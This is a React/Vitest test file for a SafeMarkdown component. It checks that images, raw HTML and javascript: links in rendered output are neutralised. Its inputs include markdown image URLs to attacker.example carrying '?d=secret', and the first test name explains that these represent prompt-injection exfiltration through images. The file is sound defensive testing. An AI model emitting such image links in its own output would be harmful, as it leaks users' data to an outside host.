import '@testing-library/jest-dom/vitest';
import { describe, expect, it } from 'vitest';
import { render, screen } from '@testing-library/react';
import { SafeMarkdown } from './SafeMarkdown';

describe('SafeMarkdown', () => {
  it('不渲染任何 <img>：圖片網址是 prompt injection 把資料帶出去的管道', () => {
    const { container } = render(
      <SafeMarkdown>{'結果如下 ![logo](https://attacker.example/x.png?d=secret)'}</SafeMarkdown>,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('attacker.example');
  });

  it('參照式圖片同樣不渲染', () => {
    const { container } = render(
      <SafeMarkdown>{'![圖][r]\n\n[r]: https://attacker.example/y.png?d=secret'}</SafeMarkdown>,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('attacker.example');
  });

  it('圖片以 alt 文字呈現，內容不消失', () => {
    render(<SafeMarkdown>{'![產品照片](https://cdn.example/p.png)'}</SafeMarkdown>);
    expect(screen.getByText('產品照片')).toBeInTheDocument();
  });

  it('原始 HTML 不被解析成元素', () => {
    const { container } = render(<SafeMarkdown>{'<img src="https://attacker.example/z.png">'}</SafeMarkdown>);
    expect(container.querySelector('img')).toBeNull();
  });

  it('連結保留，但開新分頁且不帶 referrer／opener', () => {
    render(<SafeMarkdown>{'[來源](https://docs.example/a)'}</SafeMarkdown>);
    const link = screen.getByRole('link', { name: '來源' });
    expect(link).toHaveAttribute('href', 'https://docs.example/a');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow');
    expect(link).toHaveAttribute('referrerpolicy', 'no-referrer');
  });

  it('非 http(s)/mailto 的連結不可點', () => {
    render(<SafeMarkdown>{'[點我](javascript:alert(1))'}</SafeMarkdown>);
    expect(screen.queryByRole('link')).toBeNull();
    expect(screen.getByText('點我')).toBeInTheDocument();
  });

  it('GFM 表格仍正常渲染', () => {
    const { container } = render(<SafeMarkdown>{'| a | b |\n| - | - |\n| 1 | 2 |'}</SafeMarkdown>);
    expect(container.querySelector('table')).not.toBeNull();
  });
});
